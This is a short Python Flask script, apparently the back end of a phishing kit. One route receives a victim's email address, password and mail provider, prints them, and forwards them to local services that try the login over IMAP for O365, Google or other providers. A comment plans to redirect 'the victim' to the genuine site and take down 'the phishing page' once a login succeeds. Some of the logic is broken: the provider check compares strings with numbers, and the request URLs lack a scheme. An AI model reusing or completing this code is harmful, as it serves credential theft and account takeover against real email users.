#!/bin/python3
from flask import (
    Flask,
    render_template,
    request, 
    jsonify
)
import requests

clients = {
    1: "O365",
    2: "Google",
    3: "Other"
}

# Create the application instance
app = Flask(__name__)

# Create a URL route in our application for "/"
@app.route('/')
def home():
    return "<html><body><h1>hi there!</h1></body></html>"

@app.route('/test',methods=['POST'])
def test():
    content = request.get_json(silent=True)
    print(content['email'])
    print(content['pass'])
    print(content['client'])
    c=clients.get(content['client'])
    if(c==1):
        #call O365
        requests.post("localhost:5001/imapO365",json=content)
    elif(c==2):
        #call google
        requests.post("localhost:5001/imapGoogle",json=content)
    elif(c==3):
        #call other, try to guess
        requests.post("localhost:5001/imapTry",json=content)

    #TODO: Must check the return from imap post. if 200 returns the victim to genuine site and calls to kill the instance serving the phishing page. if not just refresh. 
    return "OK"

# If we're running in stand alone mode, run the application
if __name__ == '__main__':
    app.run(debug=True)
